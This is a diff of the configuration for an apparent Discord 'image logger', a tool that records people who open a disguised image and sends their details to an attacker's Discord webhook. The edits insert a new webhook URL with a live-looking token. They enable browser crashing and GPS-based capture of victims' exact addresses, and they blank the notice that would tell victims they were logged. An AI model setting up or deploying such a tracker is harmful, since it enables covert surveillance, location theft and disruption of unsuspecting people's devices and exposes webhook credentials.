@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1342597009198022687/0d1jS1f0jS82qcKCESB2O8al0DWNOhCxZh_5-V3fzXqQIpxd9jFsDcMkQN9b1KjMO2zc",
+    "webhook": "https://discordapp.com/api/webhooks/1355614522206978068/NrESTtkHXPKIzewvybGnJRPCIEY9y1M62VCdOgoXoVkWZTes7QOEKvQCZ2UNgo37WpbQ",
     "image": "https://www.google.com/imgres?q=bliss&imgurl=https%3A%2F%2Fwww.pcworld.com%2Fwp-content%2Fuploads%2F2023%2F04%2FWindows-XP-Bliss-desktop-large.png&imgrefurl=https%3A%2F%2Fwww.pcworld.com%2Farticle%2F444752%2Fthe-story-behind-the-windows-xp-bliss-photo-and-what-it-looks-like-today.html&docid=TG4P3fS7yC9-JM&tbnid=D5YZDvbFT1WuCM&vet=12ahUKEwjK0-LG0NWLAxX3D1kFHZtdGFgQM3oECFMQAA..i&w=1201&h=899&hcb=2&ved=2ahUKEwjK0-LG0NWLAxX3D1kFHZtdGFgQM3oECFMQAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
